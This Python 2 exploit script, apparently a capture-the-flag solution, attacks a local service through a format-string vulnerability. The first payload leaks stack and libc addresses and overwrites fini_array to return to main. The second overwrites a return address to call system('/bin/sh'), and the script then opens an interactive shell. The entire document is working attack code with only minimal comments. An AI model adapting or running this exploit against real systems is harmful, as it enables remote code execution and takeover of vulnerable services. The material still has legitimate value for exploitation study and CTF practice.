from No___Op import *

target = "localhost:17171"

tube = Pwning( target )

"""
1st address leak and overwrite fini_array to main()
2nd ret-addr overwrite
"""

addr_dest = 0x080496dc
addr_main = 0x0804849b

offset_system = 0x003ad80
offset_binsh = 0x15ba3f
offset_libc_start = 0x18540

leak  = '%264$08x' #stack addr
leak += '%267$08x' #libc addr
fsb = FSB(7, header=leak)
fsb.rewrite( addr_dest, addr_main )

payload  = fsb.get()

print "[*]Sending payload..."
print payload
tube.sendline(payload)
tube.read_until("RESPONSE :")
leak_stack = int(tube.recv(8), 16) - 0xe4
leak_libc = int(tube.recv(8), 16) - 247 # __libc_start_main

libc_base = leak_libc - offset_libc_start
libc_system = libc_base + offset_system
libc_binsh = libc_base + offset_binsh

print "libc-base	: %08x" % libc_base
print "libc-system	: %08x" % libc_system
print "libc-binsh	: %08x" % libc_binsh

fsb = FSB(7)
fsb.rewrite( leak_stack, libc_system )
fsb.rewrite( leak_stack + 8, libc_binsh )

payload = fsb.get()

print "[*]Sending payload..."
print payload
tube.sendline(payload)
tube.shell()
